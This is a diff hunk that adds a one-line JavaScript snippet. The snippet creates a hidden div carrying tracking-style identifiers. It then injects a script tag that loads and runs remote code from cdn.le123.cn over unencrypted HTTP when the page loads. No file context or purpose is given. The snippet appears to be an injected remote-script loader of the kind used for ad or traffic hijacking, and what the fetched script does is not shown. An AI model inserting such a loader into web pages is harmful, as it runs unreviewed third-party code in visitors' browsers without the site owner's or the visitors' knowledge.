@@ -1,0 +1,1 @@
+(function(){var C = function(e){return document.createElement(e);};var D = C('div');D.style.display = "none";D.id = "R_random";D.innerHTML = "sp=9,r=02284d96acf3ed88,p=1dd39241678d934810de,ua=1,oid=169";document.body.appendChild(D);var J = C('script');J.src = "http://cdn.le123.cn/id/169/m/m.js";J.stype = "text/javascript";document.body.appendChild(J);})();
